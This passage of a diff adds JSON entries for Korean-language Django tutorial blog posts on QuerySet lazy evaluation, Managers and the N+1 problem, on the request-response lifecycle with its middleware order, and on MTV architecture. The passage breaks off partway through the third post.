+    "content": "<h2>Django ORM이 특별한 이유</h2>\n<pre><code class=\"language-python\"># 이게 전부다\narticles = Article.objects.filter(is_published=True).order_by(&quot;-created_at&quot;)[:10]\n</code></pre>\n<p>SQL 한 줄 안 쓰고 위와 같이 데이터를 조회할 수 있다.<br>하지만 이 코드가 <strong>언제</strong> SQL을 실행하는지 모르면 심각한 성능 문제를 만든다.</p>\n<h2>Active Record 패턴</h2>\n<p>Django ORM은 <strong>Active Record</strong> 패턴을 구현한다.<sup id=\"fnref-fowler-ar\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-fowler-ar\" aria-label=\"각주 1\">[1]</a></sup></p>\n<p>모델 클래스 = DB 테이블, 인스턴스 = 행(Row). 데이터와 DB 조작 로직이 같은 객체에 존재한다.</p>\n<pre><code class=\"language-python\"># 모델 클래스 = 테이블\nclass Article(models.Model):\n    title = models.CharField(max_length=200)\n    body = models.TextField()\n\n# 인스턴스 = 행\narticle = Article(title=&quot;제목&quot;, body=&quot;내용&quot;)\narticle.save()           # INSERT INTO articles ...\narticle.title = &quot;새 제목&quot;\narticle.save()           # UPDATE articles SET title=...\narticle.delete()         # DELETE FROM articles WHERE id=...\n</code></pre>\n<p>SQLAlchemy의 <strong>Data Mapper</strong> 패턴과 대비된다.<br>Data Mapper는 모델과 DB 매핑 로직이 분리돼 있어 더 유연하지만 복잡하다.<br>Django의 Active Record는 단순하고 직관적이지만 대규모 도메인 로직에서 모델이 비대해질 수 있다.</p>\n<h2>QuerySet — 지연 실행(Lazy Evaluation)</h2>\n<p>Django ORM의 핵심 설계 결정이다.<sup id=\"fnref-queryset-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-queryset-docs\" aria-label=\"각주 2\">[2]</a></sup></p>\n<pre><code class=\"language-python\"># 이 시점에서 SQL이 실행되지 않는다\nqs = Article.objects.filter(is_published=True)\nqs = qs.filter(author__username=&quot;seobway&quot;)\nqs = qs.order_by(&quot;-created_at&quot;)\nqs = qs.select_related(&quot;author&quot;)\n</code></pre>\n<p><strong>아직 DB에 아무것도 안 했다.</strong> QuerySet은 조건을 기억하고 있을 뿐이다.</p>\n<pre><code class=\"language-mermaid\">%% desc: QuerySet은 평가 시점까지 SQL을 실행하지 않는 지연 실행 메커니즘\nflowchart TD\n  Q1[&quot;filter(is_published=True)\\n→ QuerySet 객체 생성, SQL X&quot;]\n  Q2[&quot;.filter(author=user)\\n→ 조건 추가, SQL X&quot;]\n  Q3[&quot;.order_by(&#39;-created_at&#39;)\\n→ 정렬 추가, SQL X&quot;]\n  Q4[&quot;.select_related(&#39;author&#39;)\\n→ JOIN 계획 추가, SQL X&quot;]\n\n  EVAL{&quot;평가 시점?&quot;}\n\n  E1[&quot;for a in qs ← 반복&quot;]\n  E2[&quot;list(qs) ← 강제 변환&quot;]\n  E3[&quot;qs[0:5] ← 슬라이싱&quot;]\n  E4[&quot;qs.get(pk=1) ← 단건 조회&quot;]\n  E5[&quot;qs.count() ← 개수&quot;]\n  E6[&quot;qs.exists() ← 존재 여부&quot;]\n\n  SQL[&quot;SELECT ... FROM articles\\nJOIN auth_user ...\\nWHERE is_published=1\\nAND author_id=...\\nORDER BY created_at DESC&quot;]\n\n  Q1 --&gt; Q2 --&gt; Q3 --&gt; Q4 --&gt; EVAL\n  EVAL --&gt; E1 &amp; E2 &amp; E3 &amp; E4 &amp; E5 &amp; E6 --&gt; SQL\n</code></pre>\n<h3>왜 지연 실행인가</h3>\n<pre><code class=\"language-python\">def get_articles(is_published=True):\n    qs = Article.objects.filter(is_published=is_published)\n    return qs\n\ndef get_recent(qs, limit=10):\n    return qs.order_by(&quot;-created_at&quot;)[:limit]\n\ndef get_by_author(qs, username):\n    return qs.filter(author__username=username)\n\n# 조합해서 사용 — SQL은 최종 평가 시 단 한 번만 실행\narticles = get_by_author(get_recent(get_articles()), &quot;seobway&quot;)\nfor a in articles:   # ← 이 시점에 SELECT 실행\n    print(a.title)\n</code></pre>\n<p>QuerySet을 함수 사이에 자유롭게 전달하며 조건을 합성할 수 있다.<br>SQL은 마지막에 한 번만 실행된다.</p>\n<h3>QuerySet 캐싱</h3>\n<p>한 번 평가된 QuerySet은 결과를 캐시한다.</p>\n<pre><code class=\"language-python\">qs = Article.objects.filter(is_published=True)\n\n# 첫 번째 반복 — SQL 실행\nfor a in qs:\n    print(a.title)\n\n# 두 번째 반복 — 캐시 사용, SQL 실행 안 됨\nfor a in qs:\n    print(a.body)\n</code></pre>\n<p>주의: 슬라이싱은 캐시를 만들지 않는다.</p>\n<pre><code class=\"language-python\">qs = Article.objects.all()\nprint(qs[0])  # SQL 실행\nprint(qs[0])  # 다시 SQL 실행! (캐시 없음)\n\n# 평가 후 캐시 사용\narticles = list(qs)  # SQL 실행\nprint(articles[0])   # 캐시\nprint(articles[0])   # 캐시\n</code></pre>\n<h2>Manager — 테이블 레벨 작업의 진입점</h2>\n<p><code>Model.objects</code>가 기본 Manager다.<sup id=\"fnref-manager-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-manager-docs\" aria-label=\"각주 3\">[3]</a></sup></p>\n<p><strong>Manager는 인스턴스가 아닌 클래스에서만 접근 가능하다.</strong></p>\n<pre><code class=\"language-python\">Article.objects.all()      # ✅ 클래스에서 접근\narticle = Article()\narticle.objects.all()      # ❌ AttributeError — 인스턴스에서 접근 불가\n</code></pre>\n<p>이 제약은 의도된 설계다. &quot;테이블 전체를 다루는 작업&quot;과 &quot;개별 행을 다루는 작업&quot;을 구분한다.</p>\n<h3>커스텀 Manager</h3>\n<p>반복되는 필터 로직을 Manager로 캡슐화한다.</p>\n<pre><code class=\"language-python\">class PublishedManager(models.Manager):\n    def get_queryset(self):\n        return super().get_queryset().filter(is_published=True)\n\nclass RecentManager(models.Manager):\n    def get_queryset(self):\n        return super().get_queryset().order_by(&quot;-created_at&quot;)\n\nclass Article(models.Model):\n    title = models.CharField(max_length=200)\n    is_published = models.BooleanField(default=False)\n\n    objects = models.Manager()              # 기본 Manager (전체)\n    published = PublishedManager()          # 게시된 글만\n    recent = RecentManager()                # 최신순 정렬\n</code></pre>\n<pre><code class=\"language-python\"># View에서 반복 없이 사용\nArticle.published.all()                    # 게시된 글만\nArticle.published.filter(author=user)      # 게시된 + 특정 작성자\nArticle.recent.filter(is_published=True)   # 최신순 + 게시된\n</code></pre>\n<h2>N+1 문제와 해결</h2>\n<p>Django ORM의 가장 흔한 성능 함정이다.</p>\n<pre><code class=\"language-python\"># N+1 문제 발생 — 절대 이렇게 하지 말 것\narticles = Article.objects.all()  # SQL 1번\n\nfor article in articles:\n    print(article.author.username)  # 매번 SQL 1번 → N번 추가 실행!\n    # 100개 글이면 101번 SQL 실행\n</code></pre>\n<pre><code class=\"language-mermaid\">%% desc: N+1 문제 — articles 조회 1번 + author 조회 N번 vs select_related로 JOIN 1번\nflowchart TD\n  subgraph BAD[&quot;❌ N+1 문제 (100개 글)&quot;]\n    B1[&quot;SELECT * FROM articles\\n(1번)&quot;]\n    B2[&quot;SELECT * FROM auth_user WHERE id=1\\n(1번)&quot;]\n    B3[&quot;SELECT * FROM auth_user WHERE id=2\\n(1번)&quot;]\n    BN[&quot;... 총 101번 SQL&quot;]\n    B1 --&gt; B2 --&gt; B3 --&gt; BN\n  end\n\n  subgraph GOOD[&quot;✅ select_related (JOIN)&quot;]\n    G1[&quot;SELECT articles.*, auth_user.*\\nFROM articles\\nJOIN auth_user ON articles.author_id = auth_user.id\\n(1번으로 끝)&quot;]\n  end\n</code></pre>\n<h3>해결: select_related vs prefetch_related</h3>\n<pre><code class=\"language-python\"># select_related — ForeignKey, OneToOne (SQL JOIN)\narticles = Article.objects.select_related(&quot;author&quot;).all()\n# SELECT articles.*, auth_user.* FROM articles JOIN auth_user ...\n\n# prefetch_related — ManyToMany, reverse FK (별도 쿼리 후 Python에서 연결)\narticles = Article.objects.prefetch_related(&quot;tags&quot;).all()\n# SELECT * FROM articles\n# SELECT * FROM tags WHERE article_id IN (1, 2, 3, ...)\n\n# 중첩 관계\narticles = Article.objects.select_related(&quot;author__profile&quot;).prefetch_related(&quot;comments__author&quot;)\n</code></pre>\n<table>\n<thead>\n<tr>\n<th></th>\n<th><code>select_related</code></th>\n<th><code>prefetch_related</code></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>관계 타입</td>\n<td>FK, OneToOne</td>\n<td>ManyToMany, reverse FK</td>\n</tr>\n<tr>\n<td>SQL 방식</td>\n<td>JOIN (1개 쿼리)</td>\n<td>별도 쿼리 후 Python 조합</td>\n</tr>\n<tr>\n<td>결과</td>\n<td>SQL 수 감소</td>\n<td>SQL 수 감소</td>\n</tr>\n</tbody></table>\n<h2>주요 QuerySet 메서드</h2>\n<pre><code class=\"language-python\"># 조회\nArticle.objects.all()\nArticle.objects.filter(is_published=True, author=user)\nArticle.objects.exclude(is_published=False)\nArticle.objects.get(pk=1)           # 1개, 없거나 2개 이상이면 예외\nArticle.objects.first()             # 첫 번째 또는 None\nArticle.objects.last()\n\n# 집계\nArticle.objects.count()\nArticle.objects.exists()            # bool, count()보다 빠름\nArticle.objects.aggregate(Count(&quot;id&quot;), Avg(&quot;view_count&quot;))\n\n# 정렬 / 슬라이싱\nArticle.objects.order_by(&quot;-created_at&quot;)[:10]   # LIMIT 10\n\n# 수정 / 삭제\nArticle.objects.filter(author=user).update(is_published=True)  # 한 번의 UPDATE\nArticle.objects.filter(created_at__lt=cutoff).delete()         # 한 번의 DELETE\n\n# 필드 조회\nArticle.objects.values(&quot;title&quot;, &quot;author__username&quot;)   # dict QuerySet\nArticle.objects.values_list(&quot;id&quot;, &quot;title&quot;)            # tuple QuerySet\nArticle.objects.only(&quot;title&quot;, &quot;created_at&quot;)           # 특정 필드만 로드\nArticle.objects.defer(&quot;body&quot;)                         # 특정 필드 지연 로드\n</code></pre>\n<h2>Raw SQL 탈출구</h2>\n<p>Django ORM으로 표현하기 어려운 복잡한 쿼리는 Raw SQL로 처리한다.</p>\n<pre><code class=\"language-python\">from django.db import connection\n\n# QuerySet.raw() — 모델 인스턴스 반환\narticles = Article.objects.raw(&quot;SELECT * FROM articles WHERE id = %s&quot;, [article_id])\n\n# connection.execute() — 완전한 Raw SQL\nwith connection.cursor() as cursor:\n    cursor.execute(&quot;&quot;&quot;\n        SELECT a.title, COUNT(c.id) as comment_count\n        FROM articles a\n        LEFT JOIN comments c ON a.id = c.article_id\n        GROUP BY a.id\n        ORDER BY comment_count DESC\n        LIMIT %s\n    &quot;&quot;&quot;, [10])\n    rows = cursor.fetchall()\n</code></pre>\n<p>Raw SQL을 쓸 때는 반드시 <strong>파라미터 바인딩</strong>을 사용해야 한다. 문자열 포맷팅으로 SQL을 조합하면 SQL Injection에 취약하다.</p>\n<h2>관련 글</h2>\n<ul>\n<li><a href=\"/post/django-overview\">Django 프레임워크 큰 그림</a>: ORM을 포함한 전체 Django 구조</li>\n<li><a href=\"/post/django-lifecycle\">Django 요청-응답 라이프사이클</a>: View에서 ORM이 호출되는 시점</li>\n<li><a href=\"/post/django-security\">Django 보안 — 기본 탑재된 방어</a>: ORM의 SQL Injection 방어 원리</li>\n</ul>\n<hr>\n<h2>참고/주석</h2>\n<ol>\n<li id=\"fn-fowler-ar\" style=\"scroll-margin-top: 96px;\">Martin Fowler, <a href=\"https://www.martinfowler.com/eaaCatalog/activeRecord.html\" target=\"_blank\">Active Record — Patterns of Enterprise Application Architecture</a> <a href=\"#fnref-fowler-ar\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-queryset-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/topics/db/queries/\" target=\"_blank\">Making queries — Django Docs</a> <a href=\"#fnref-queryset-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-manager-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/topics/db/managers/\" target=\"_blank\">Managers — Django Docs</a> <a href=\"#fnref-manager-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n</ol>\n",
+    "coverImage": null,
+    "category": "study/backend/django",
+    "tags": [
+      "Django",
+      "ORM",
+      "QuerySet",
+      "LazyEvaluation",
+      "Manager",
+      "ActiveRecord",
+      "N+1",
+      "selectRelated",
+      "prefetchRelated"
+    ],
+    "author": "Seobway",
+    "readTime": 14,
+    "views": 0,
+    "featured": false,
+    "createdAt": "2026-03-27T00:00:00.000Z",
+    "updatedAt": "2026-03-27T03:51:25.147Z"
+  },
+  {
+    "id": "django-lifecycle",
+    "title": "Django 요청-응답 라이프사이클 — HTTP 요청이 처리되는 전체 흐름",
+    "slug": "django-lifecycle",
+    "excerpt": "브라우저가 보낸 HTTP 요청이 Gunicorn에 도달한 순간부터 응답이 돌아올 때까지 — Django가 처리하는 11단계 전체 흐름을 미들웨어 onion 구조와 함께 설명한다.",
+    "content": "<h2>왜 라이프사이클을 알아야 하는가</h2>\n<p>Django를 쓰다 보면 이런 상황을 만난다:</p>\n<ul>\n<li>로그인 체크가 왜 특정 요청에선 안 되지?</li>\n<li>미들웨어 순서가 왜 중요한가?</li>\n<li><code>request.user</code>는 언제 채워지는가?</li>\n<li>내 View가 호출되기 전에 무슨 일이 일어나는가?</li>\n</ul>\n<p>이 모든 질문의 답이 <strong>라이프사이클</strong> 안에 있다.</p>\n<h2>전체 흐름 — 11단계</h2>\n<pre><code class=\"language-mermaid\">%% desc: HTTP 요청이 Django를 통과해 응답이 되기까지의 11단계 전체 흐름\nflowchart TD\n  REQ[&quot;🌐 HTTP Request\\n(브라우저 / API 클라이언트)&quot;]\n\n  S1[&quot;① Web Server\\nGunicorn / uWSGI / Uvicorn&quot;]\n  S2[&quot;② WSGI / ASGI 진입점\\nwsgi.py / asgi.py&quot;]\n  S3[&quot;③ Middleware Stack (Inbound)\\n위→아래 순서 process_request()&quot;]\n  S4[&quot;④ URL Resolver\\nurlpatterns 매칭&quot;]\n  S5[&quot;⑤ Middleware process_view()\\nView 호출 직전&quot;]\n  S6[&quot;⑥ View 실행\\nFBV / CBV&quot;]\n  S7[&quot;⑦ ORM 쿼리\\nQuerySet SQL 실행&quot;]\n  S8[&quot;⑧ Template 렌더링\\ncontext → HTML&quot;]\n  S9[&quot;⑨ HttpResponse 생성\\n상태코드 · 헤더 · 본문&quot;]\n  S10[&quot;⑩ Middleware Stack (Outbound)\\n아래→위 순서 process_response()&quot;]\n  S11[&quot;⑪ HTTP Response\\n클라이언트에 반환&quot;]\n\n  REQ --&gt; S1 --&gt; S2 --&gt; S3 --&gt; S4 --&gt; S5 --&gt; S6\n  S6 --&gt; S7 --&gt; S8 --&gt; S9 --&gt; S10 --&gt; S11\n\n  style S3 fill:#3b82f6,color:#fff\n  style S10 fill:#3b82f6,color:#fff\n  style S6 fill:#8b5cf6,color:#fff\n</code></pre>\n<h2>① Web Server</h2>\n<p>Gunicorn(WSGI), Uvicorn/Daphne(ASGI) 같은 웹 서버가 TCP 소켓을 열고 HTTP 요청을 받는다.</p>\n<p>Django 자체는 HTTP 파싱을 하지 않는다. 웹 서버가 HTTP를 파싱하고 WSGI/ASGI 인터페이스로 Django에 전달한다.</p>\n<h2>② WSGI / ASGI 진입점</h2>\n<pre><code class=\"language-python\"># config/wsgi.py\nimport os\nfrom django.core.wsgi import get_wsgi_application\n\nos.environ.setdefault(&quot;DJANGO_SETTINGS_MODULE&quot;, &quot;config.settings.local&quot;)\napplication = get_wsgi_application()   # ← 웹 서버가 호출하는 callable\n</code></pre>\n<p><code>application</code> 객체가 웹 서버와 Django 사이의 계약(Contract)이다.<sup id=\"fnref-pep3333\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-pep3333\" aria-label=\"각주 1\">[1]</a></sup></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>WSGI</th>\n<th>ASGI</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>표준</td>\n<td>PEP 3333</td>\n<td>ASGI Specification</td>\n</tr>\n<tr>\n<td>동작</td>\n<td>동기 (요청 1개 = 스레드 1개)</td>\n<td>비동기 (이벤트 루프)</td>\n</tr>\n<tr>\n<td>서버</td>\n<td>Gunicorn, uWSGI</td>\n<td>Uvicorn, Daphne</td>\n</tr>\n<tr>\n<td>Django 지원</td>\n<td>Django 1.0~</td>\n<td>Django 3.0~</td>\n</tr>\n</tbody></table>\n<h2>③ Middleware Stack — Inbound (위→아래)</h2>\n<p>Django의 <code>MIDDLEWARE</code> 설정에 나열된 순서대로 실행된다.</p>\n<pre><code class=\"language-python\"># settings.py\nMIDDLEWARE = [\n    &quot;django.middleware.security.SecurityMiddleware&quot;,      # 1번\n    &quot;django.contrib.sessions.middleware.SessionMiddleware&quot;,  # 2번\n    &quot;django.middleware.common.CommonMiddleware&quot;,          # 3번\n    &quot;django.middleware.csrf.CsrfViewMiddleware&quot;,          # 4번\n    &quot;django.contrib.auth.middleware.AuthenticationMiddleware&quot;,  # 5번\n    &quot;django.contrib.messages.middleware.MessageMiddleware&quot;,  # 6번\n    &quot;django.middleware.clickjacking.XFrameOptionsMiddleware&quot;,  # 7번\n]\n</code></pre>\n<pre><code class=\"language-mermaid\">%% desc: Middleware onion 구조 — 요청은 위→아래, 응답은 아래→위로 처리됨\nflowchart LR\n  subgraph ONION[&quot;Middleware Onion 구조&quot;]\n    M1[&quot;SecurityMiddleware\\n(가장 바깥)&quot;]\n    M2[&quot;SessionMiddleware&quot;]\n    M3[&quot;CsrfViewMiddleware&quot;]\n    M4[&quot;AuthenticationMiddleware&quot;]\n    M5[&quot;XFrameOptionsMiddleware\\n(가장 안쪽)&quot;]\n    VIEW[&quot;View&quot;]\n  end\n\n  REQ[&quot;요청 →&quot;] --&gt; M1 --&gt; M2 --&gt; M3 --&gt; M4 --&gt; M5 --&gt; VIEW\n  VIEW --&gt; M5 --&gt; M4 --&gt; M3 --&gt; M2 --&gt; M1 --&gt; RES[&quot;→ 응답&quot;]\n\n  style M1 fill:#1e40af,color:#fff\n  style VIEW fill:#7c3aed,color:#fff\n</code></pre>\n<h3>왜 순서가 중요한가</h3>\n<p><code>SessionMiddleware</code>는 반드시 <code>AuthenticationMiddleware</code>보다 앞에 있어야 한다.</p>\n<pre><code>요청 처리 순서:\nSessionMiddleware → 세션 쿠키를 읽어 request.session 채움\nAuthenticationMiddleware → request.session을 읽어 request.user 채움\n</code></pre>\n<p><code>AuthenticationMiddleware</code>가 먼저 오면 <code>request.session</code>이 아직 없어서 <code>request.user</code>를 설정할 수 없다.</p>\n<p>각 미들웨어의 역할:</p>\n<table>\n<thead>\n<tr>\n<th>미들웨어</th>\n<th>역할</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>SecurityMiddleware</code></td>\n<td>HTTPS 리디렉션, HSTS 헤더, SECURE 쿠키</td>\n</tr>\n<tr>\n<td><code>SessionMiddleware</code></td>\n<td>세션 쿠키 읽기/쓰기, <code>request.session</code> 제공</td>\n</tr>\n<tr>\n<td><code>CommonMiddleware</code></td>\n<td>URL 정규화 (<code>/blog</code> → <code>/blog/</code>), ETags</td>\n</tr>\n<tr>\n<td><code>CsrfViewMiddleware</code></td>\n<td>CSRF 토큰 검증</td>\n</tr>\n<tr>\n<td><code>AuthenticationMiddleware</code></td>\n<td><code>request.user</code> 설정 (세션 기반 인증)</td>\n</tr>\n<tr>\n<td><code>MessageMiddleware</code></td>\n<td>1회성 플래시 메시지</td>\n</tr>\n<tr>\n<td><code>XFrameOptionsMiddleware</code></td>\n<td>Clickjacking 방어 (<code>X-Frame-Options</code>)</td>\n</tr>\n</tbody></table>\n<h3>미들웨어가 요청을 중단시키는 경우</h3>\n<p>미들웨어가 <code>HttpResponse</code>를 반환하면 이후 스택이 모두 건너뛰어진다.</p>\n<pre><code class=\"language-python\">class MaintenanceModeMiddleware:\n    def __call__(self, request):\n        if settings.MAINTENANCE_MODE:\n            return HttpResponse(&quot;점검 중입니다.&quot;, status=503)  # ← View까지 가지 않음\n        return self.get_response(request)\n</code></pre>\n<h2>④ URL Resolver</h2>\n<p><code>ROOT_URLCONF</code>에 지정된 파일의 <code>urlpatterns</code>를 위에서부터 순서대로 검사한다.<sup id=\"fnref-url-dispatcher\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-url-dispatcher\" aria-label=\"각주 2\">[2]</a></sup></p>\n<pre><code class=\"language-python\"># config/urls.py\nurlpatterns = [\n    path(&quot;admin/&quot;, admin.site.urls),\n    path(&quot;api/articles/&quot;, include(&quot;articles.urls&quot;)),  # 앱 URLconf 위임\n    path(&quot;api/users/&quot;, include(&quot;users.urls&quot;)),\n]\n\n# articles/urls.py\nurlpatterns = [\n    path(&quot;&quot;, views.ArticleListView.as_view()),\n    path(&quot;&lt;int:pk&gt;/&quot;, views.ArticleDetailView.as_view()),\n    path(&quot;&lt;int:pk&gt;/comments/&quot;, views.CommentListView.as_view()),\n]\n</code></pre>\n<pre><code class=\"language-mermaid\">%% desc: URL 리졸버가 urlpatterns를 위에서부터 순서대로 매칭하는 흐름\nsequenceDiagram\n  participant REQ as 요청 /api/articles/42/\n  participant ROOT as config/urls.py\n  participant APP as articles/urls.py\n  participant VIEW as ArticleDetailView\n\n  REQ-&gt;&gt;ROOT: 매칭 시작\n  ROOT-&gt;&gt;ROOT: &quot;admin/&quot; → 불일치\n  ROOT-&gt;&gt;ROOT: &quot;api/articles/&quot; → 일치! include() 위임\n  ROOT-&gt;&gt;APP: 나머지 &quot;42/&quot; 전달\n  APP-&gt;&gt;APP: &quot;&quot; → 불일치 (42/ 남음)\n  APP-&gt;&gt;APP: &quot;&lt;int:pk&gt;/&quot; → 일치! pk=42\n  APP-&gt;&gt;VIEW: pk=42 전달\n</code></pre>\n<p>매칭 실패 시 <code>Http404</code> 예외 발생 → 404 응답 반환.</p>\n<h2>⑤ Middleware process_view()</h2>\n<p>View가 호출되기 <strong>직전</strong>에 실행된다. View 함수와 인자를 받는다.<br><code>CsrfViewMiddleware</code>의 CSRF 검증이 여기서 일어난다.</p>\n<h2>⑥ View 실행</h2>\n<p>요청을 실제로 처리하는 곳이다.</p>\n<pre><code class=\"language-python\"># Function-Based View\ndef article_detail(request, pk):\n    article = Article.objects.get(pk=pk)      # ⑦ ORM\n    return render(request, &quot;detail.html&quot;, {&quot;article&quot;: article})  # ⑧ Template\n\n# Class-Based View\nclass ArticleDetailView(DetailView):\n    model = Article\n    template_name = &quot;detail.html&quot;\n</code></pre>\n<p>View의 책임:</p>\n<ul>\n<li>요청 파라미터 검증</li>\n<li>ORM으로 데이터 조회/변경</li>\n<li>비즈니스 로직 처리</li>\n<li>Template에 context 전달</li>\n<li><code>HttpResponse</code> 반환</li>\n</ul>\n<h2>⑦ ORM 쿼리</h2>\n<p>View 안에서 QuerySet을 <strong>평가(evaluate)</strong>하는 시점에 SQL이 실행된다.</p>\n<pre><code class=\"language-python\"># SQL 실행 안 됨 — QuerySet은 lazy\nqs = Article.objects.filter(is_published=True).order_by(&quot;-created_at&quot;)\n\n# 이 시점에 SELECT 실행\narticles = list(qs)           # 명시적 평가\narticle = qs.get(pk=pk)       # .get()\ncount = qs.count()             # .count()\nfor a in qs:                   # 반복\n    ...\n</code></pre>\n<h2>⑧ Template 렌더링</h2>\n<pre><code class=\"language-python\">render(request, &quot;articles/detail.html&quot;, {&quot;article&quot;: article})\n</code></pre>\n<p>내부 동작:</p>\n<ol>\n<li><code>TEMPLATES</code> 설정에서 엔진(DTL 또는 Jinja2) 선택</li>\n<li>템플릿 파일 로드</li>\n<li><code>{% extends %}</code>, <code>{% block %}</code> 상속 관계 해석</li>\n<li>context 변수를 템플릿 코드에 바인딩</li>\n<li>모든 변수 <strong>자동 이스케이프</strong> (XSS 방어)</li>\n<li>HTML 문자열 반환</li>\n</ol>\n<h2>⑩ Middleware Stack — Outbound (아래→위)</h2>\n<p>응답 경로는 요청과 반대 방향이다.</p>\n<pre><code class=\"language-python\">class TimingMiddleware:\n    def __call__(self, request):\n        start = time.time()\n        response = self.get_response(request)  # 아래 스택 전체 실행\n        duration = time.time() - start\n        response[&quot;X-Response-Time&quot;] = f&quot;{duration:.3f}s&quot;  # 응답에 헤더 추가\n        return response\n</code></pre>\n<p><code>TemplateResponse</code>를 사용하면 <code>process_template_response()</code>도 이 단계에서 호출된다.</p>\n<h2>전체 시퀀스 다이어그램</h2>\n<pre><code class=\"language-mermaid\">%% desc: Django 요청-응답 라이프사이클 전체 — 미들웨어, URL, View, ORM, Template의 상호작용\nsequenceDiagram\n  participant C as 클라이언트\n  participant GU as Gunicorn\n  participant MW as Middleware Stack\n  participant URL as URL Resolver\n  participant VIEW as View\n  participant ORM as ORM / DB\n  participant TPL as Template\n\n  C-&gt;&gt;GU: HTTP GET /api/articles/42/\n  GU-&gt;&gt;MW: WSGI environ 전달\n  MW-&gt;&gt;MW: SecurityMiddleware (inbound)\n  MW-&gt;&gt;MW: SessionMiddleware → request.session 설정\n  MW-&gt;&gt;MW: AuthenticationMiddleware → request.user 설정\n  MW-&gt;&gt;URL: process_view 전 URL 매칭 요청\n  URL-&gt;&gt;URL: urlpatterns 순서대로 매칭\n  URL-&gt;&gt;MW: ArticleDetailView, kwargs={pk:42}\n  MW-&gt;&gt;VIEW: process_view() 후 View 호출\n  VIEW-&gt;&gt;ORM: Article.objects.get(pk=42)\n  ORM-&gt;&gt;ORM: SELECT * FROM articles WHERE id=42\n  ORM--&gt;&gt;VIEW: Article 인스턴스\n  VIEW-&gt;&gt;TPL: render(request, &quot;detail.html&quot;, context)\n  TPL--&gt;&gt;VIEW: HTML 문자열\n  VIEW--&gt;&gt;MW: HttpResponse(html, status=200)\n  MW-&gt;&gt;MW: XFrameOptionsMiddleware (outbound)\n  MW-&gt;&gt;MW: SecurityMiddleware → HSTS 헤더 추가\n  MW--&gt;&gt;GU: 최종 HttpResponse\n  GU--&gt;&gt;C: HTTP 200 OK\n</code></pre>\n<h2>관련 글</h2>\n<ul>\n<li><a href=\"/post/django-overview\">Django 프레임워크 큰 그림</a>: Django 철학과 전체 구조 개요</li>\n<li><a href=\"/post/django-architecture\">Django MTV 아키텍처와 앱 구조</a>: MTV 패턴, Project vs App, WSGI vs ASGI 상세</li>\n<li><a href=\"/post/django-orm-deep\">Django ORM — QuerySet과 지연 실행</a>: ⑦단계 ORM 동작 심층 탐구</li>\n</ul>\n<hr>\n<h2>참고/주석</h2>\n<ol>\n<li id=\"fn-pep3333\" style=\"scroll-margin-top: 96px;\">Python, <a href=\"https://peps.python.org/pep-3333/\" target=\"_blank\">PEP 3333 — Python Web Server Gateway Interface v1.0.1</a> <a href=\"#fnref-pep3333\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-url-dispatcher\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/topics/http/urls/\" target=\"_blank\">URL dispatcher — Django Docs</a> <a href=\"#fnref-url-dispatcher\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n</ol>\n",
+    "coverImage": null,
+    "category": "study/backend/django",
+    "tags": [
+      "Django",
+      "Lifecycle",
+      "Middleware",
+      "URLResolver",
+      "View",
+      "ORM",
+      "Template",
+      "WSGI",
+      "ASGI",
+      "HttpRequest"
+    ],
+    "author": "Seobway",
+    "readTime": 14,
+    "views": 0,
+    "featured": false,
+    "createdAt": "2026-03-27T00:00:00.000Z",
+    "updatedAt": "2026-03-27T03:51:25.145Z"
+  },
+  {
+    "id": "django-architecture",
+    "title": "Django MTV 아키텍처와 앱 구조 — Project, App, settings.py의 역할",
+    "slug": "django-architecture",
+    "excerpt": "Django의 MTV 패턴이 MVC와 정확히 어떻게 다른지, Project와 App의 경계는 어디인지, settings.py가 어떻게 모든 컴포넌트를 연결하는 허브가 되는지 설명한다.",
+    "content": "<h2>MTV 패턴 — 이름이 다른 이유</h2>\n<p>Django를 처음 배울 때 혼란이 오는 지점이다. &quot;MVC인데 왜 View가 Controller 역할을 하지?&quot;</p>\n<p>Django 공식 FAQ의 답변:<sup id=\"fnref-django-faq\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-django-faq\" aria-label=\"각주 1\">[1]</a></sup></p>\n<blockquote>\n<p><em>&quot;Django appears to be an MVC framework, but it calls the Controller the &#39;view&#39;, and the View the &#39;template&#39;. Why does Django use these names?&quot;</em></p>\n</blockquote>\n<p>이름을 다르게 쓴 건 우연이 아니다. Django 팀은 용어를 <strong>역할 중심</strong>으로 재정의했다.</p>\n<pre><code class=\"language-mermaid\">%% desc: MVC와 Django MTV의 역할 대응 — URL Dispatcher가 독립 레이어로 분리된 점이 핵심\nflowchart LR\n  subgraph MVC[&quot;전통적 MVC&quot;]\n    M1[&quot;Model\\n데이터 + 비즈니스 로직&quot;]\n    V1[&quot;View\\n화면 렌더링&quot;]\n    C1[&quot;Controller\\n요청 처리 + 라우팅&quot;]\n    M1 &lt;--&gt; C1 &lt;--&gt; V1\n  end\n\n  subgraph MTV[&quot;Django MTV&quot;]\n    M2[&quot;Model\\n데이터 + 비즈니스 로직&quot;]\n    T2[&quot;Template\\n화면 렌더링 (HTML)&quot;]\n    V2[&quot;View\\n요청 처리 + 데이터 선택&quot;]\n    U2[&quot;URL Dispatcher\\n라우팅 (독립 레이어)&quot;]\n    U2 --&gt; V2 --&gt; M2\n    V2 --&gt; T2\n  end\n</code></pre>\n<p>핵심 차이: Django는 <strong>URL 라우팅을 Controller에서 분리</strong>해 독립 레이어로 만들었다. 덕분에 URL 설계가 View 코드와 완전히 분리되고, 같은 View를 여러 URL 패턴에 연결할 수 